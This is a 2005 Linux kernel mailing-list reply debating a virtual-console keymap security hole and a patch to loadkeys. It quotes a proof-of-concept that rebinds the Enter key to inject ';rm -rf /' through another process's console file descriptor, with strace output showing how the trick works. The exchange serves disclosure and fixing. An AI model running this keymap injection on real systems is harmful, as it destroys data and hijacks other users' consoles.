Return-Path: <linux-kernel-owner+willy=40w.ods.org-S932086AbVLCRRt@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S932086AbVLCRRt (ORCPT <rfc822;willy@w.ods.org>);
	Sat, 3 Dec 2005 12:17:49 -0500
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S932089AbVLCRRt
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Sat, 3 Dec 2005 12:17:49 -0500
Received: from mail-in-06.arcor-online.net ([151.189.21.46]:51911 "EHLO
	mail-in-01.arcor-online.net") by vger.kernel.org with ESMTP
	id S932086AbVLCRRs (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
	Sat, 3 Dec 2005 12:17:48 -0500
Date: Sat, 3 Dec 2005 18:19:47 +0100 (CET)
From: Bodo Eggert <7eggert@gmx.de>
To: Andries Brouwer <Andries.Brouwer@cwi.nl>
cc: Bodo Eggert <7eggert@gmx.de>, linux-kernel@vger.kernel.org, akpm@osdl.org,
       horms@verge.net.au
Subject: Re: security / kbd
In-Reply-To: <20051203144659.GA2091@apps.cwi.nl>
Message-ID: <Pine.LNX.4.58.0512031650450.2051@be1.lrz>
References: <5f6Fp-1ZB-11@gated-at.bofh.it> <E1EiLA5-0001VE-64@be1.lrz>
 <20051203013455.GB24760@apps.cwi.nl> <Pine.LNX.4.58.0512030251570.6039@be1.lrz>
 <20051203023946.GC24760@apps.cwi.nl> <Pine.LNX.4.58.0512030616230.6684@be1.lrz>
 <20051203144659.GA2091@apps.cwi.nl>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII
X-be10.7eggert.dyndns.org-MailScanner-Information: See www.mailscanner.info for information
X-be10.7eggert.dyndns.org-MailScanner: Found to be clean
X-be10.7eggert.dyndns.org-MailScanner-From: 7eggert@web.de
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org

On Sat, 3 Dec 2005, Andries Brouwer wrote:

> On Sat, Dec 03, 2005 at 06:33:51AM +0100, Bodo Eggert wrote:
> 
> > > Please describe the perceived security problem.
> > > You log in remotely to my machine. Want to do something evil.
> > > What precisely do you do?
> > 
> > echo -e 'keycode 28 F70
> >          string  F70 ";rm -rf /\x0a"' | loadkeys > /proc/0815/fd/1
> > 
> > where process 0815 is a "sleep 2147483647&"
> 
> I already told you the result:
> 
>   loadkeys: Couldnt get a file descriptor referring to the console
> 
> > I had stale permissions on /dev/tty0. With correct permission settings, 
> > you'll need a session belonging to the malicious user.
> 
> Aha. So it seems you withdraw the "remote" part, and say that
> a local user can leave a process with an open filedescriptor
> on a console, and that process can be used to access the console
> later. True.

You can trigger it remotely after launchning the process:

Failed case:
$ chroot . ./strace ./loadkeys -d
...
open("/dev/tty", O_RDWR)                = -1 ENOENT (No such file or 
directory)
open("/dev/tty0", O_RDWR)               = -1 ENOENT (No such file or 
directory)
open("/dev/vc/0", O_RDWR)               = -1 ENOENT (No such file or 
directory)
open("/dev/console", O_RDWR)            = -1 ENOENT (No such file or 
directory)
ioctl(0, 0x4b33, 0xbf8382d3)            = -1 EINVAL (Invalid argument)
ioctl(1, 0x4b33, 0xbf8382d3)            = -1 EINVAL (Invalid argument)
ioctl(2, 0x4b33, 0xbf8382d3)            = -1 EINVAL (Invalid argument)
write(2, "Couldnt get a file descriptor re"..., 55Couldnt get a file 
descriptor referring to the console
) = 55
munmap(0x4014d000, 4096)                = 0
exit_group(1)                           = ?
$

Success:

$ chroot . ./loadkeys -d < proc/6903/fd/1
Loading /usr/share/kbd/keymaps/defkeymap.map.gz
$ chroot . ./strace ./loadkeys -d < proc/6903/fd/1
...
open("/dev/tty", O_RDWR)                = -1 ENOENT (No such file or 
directory)
open("/dev/tty0", O_RDWR)               = -1 ENOENT (No such file or 
directory)
open("/dev/vc/0", O_RDWR)               = -1 ENOENT (No such file or 
directory)
open("/dev/console", O_RDWR)            = -1 ENOENT (No such file or 
directory)
ioctl(0, 0x4b33, 0xbfaa2493)            = 0
munmap(0x4014d000, 4096)                = 0
exit_group(0)                           = ?
$

> But there are many ways of using such a file descriptor.
> This patch cripples the keymap changing but does not solve anything.

Obviously it solves only a part. OTOH you can't keep an exploit open just 
because there is another exploit. Like I said, use chmod u+s loadkeys.

> The basic problem is that some things are common for all virtual
> consoles, while on the other hand vhangup() on one VC does not
> influence the other VCs.
> 
> Probably those common parts should be split and made per-VC.

ACK. Congrats to volunteering :-)
-- 
"If you see a bomb technician running, follow him."
-U.S.A.F. Ammo Tech Sgt
